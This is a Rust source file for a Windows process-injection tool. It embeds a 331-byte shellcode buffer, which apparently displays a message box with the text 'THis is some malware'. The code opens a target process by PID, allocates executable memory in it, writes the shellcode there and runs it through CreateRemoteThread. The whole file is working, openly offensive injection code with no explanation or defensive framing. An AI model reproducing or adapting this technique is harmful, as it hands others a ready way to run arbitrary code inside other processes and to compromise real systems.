
use std::ffi::c_void;
use std::mem::transmute;

use windows_sys::Win32::System::Threading::{CreateRemoteThread, OpenProcess, PROCESS_ALL_ACCESS};
use windows_sys::Win32::System::Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use std::env;

const buf: [u8; 331] = [0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,
0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,0x8b,
0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,
0x3e,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,0x48,0x8b,0x52,0x20,
0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,0x00,
0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,
0x8b,0x48,0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
0x5c,0x48,0xff,0xc9,0x3e,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,0x08,
0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,
0x01,0xd0,0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,
0x1c,0x49,0x01,0xd0,0x3e,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,
0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,
0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,
0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x3e,
0x48,0x8d,0x8d,0x33,0x01,0x00,0x00,0x41,0xba,0x4c,0x77,0x26,
0x07,0xff,0xd5,0x49,0xc7,0xc1,0x00,0x00,0x00,0x00,0x3e,0x48,
0x8d,0x95,0x0e,0x01,0x00,0x00,0x3e,0x4c,0x8d,0x85,0x1e,0x01,
0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,
0x48,0x65,0x6c,0x6c,0x6f,0x20,0x66,0x72,0x6f,0x6d,0x20,0x72,
0x75,0x73,0x74,0x00,0x54,0x48,0x69,0x73,0x20,0x69,0x73,0x20,
0x73,0x6f,0x6d,0x65,0x20,0x6d,0x61,0x6c,0x77,0x61,0x72,0x65,
0x00,0x75,0x73,0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00
];

const p_ptr: *const c_void = buf.as_ptr() as *const c_void;
const p_len: usize = buf.len();

fn inject(pid: u32, payload_prt: *const c_void, payload_len: usize) {
    unsafe {
        let open = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);

        match open {
            0 => {
                println!("Failed to open process");
            }
            _ => {
                let remote_mem_ptr = VirtualAllocEx(open, std::ptr::null_mut(), payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

                if !remote_mem_ptr.is_null() {
                    println!("Memory allocated in remote process");
                    let write_process = WriteProcessMemory(open, remote_mem_ptr, payload_prt, payload_len, std::ptr::null_mut());

                    match write_process {
                        0 => {
                            println!("Failed to write memory in remote process");
                        }
                        _ => {

                            let remote_thread = CreateRemoteThread(open, std::ptr::null_mut(), 0, transmute(remote_mem_ptr), std::ptr::null_mut(), 0, std::ptr::null_mut());

                            match remote_thread {
                                0 => {
                                    println!("Failed to create remote thread");
                                }
                                _ => {
                                    println!("Remote thread created");
                                    println!("Payload executed in remote process");
                                }
                            }
                            println!("Memory written in remote process");
                        }
                        
                    }

                } else {
                    println!("Failed to allocate memory in remote process");
                    
                }
                println!("Process opened");
            }
            
        }
    }

}



fn main() {

    let pid = 0x00000000; // Enter the PID of the process you want to inject the payload into

    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        eprintln!("Usage: {} <pid>", args[0]);
        std::process::exit(1);
    }

    let pid = match args[1].parse::<u32>() {
        Ok(n) => n,
        Err(_) => {
            eprintln!("Invalid PID: {}", args[1]);
            std::process::exit(1);
        }
    };

    inject(pid, p_ptr, p_len);
}
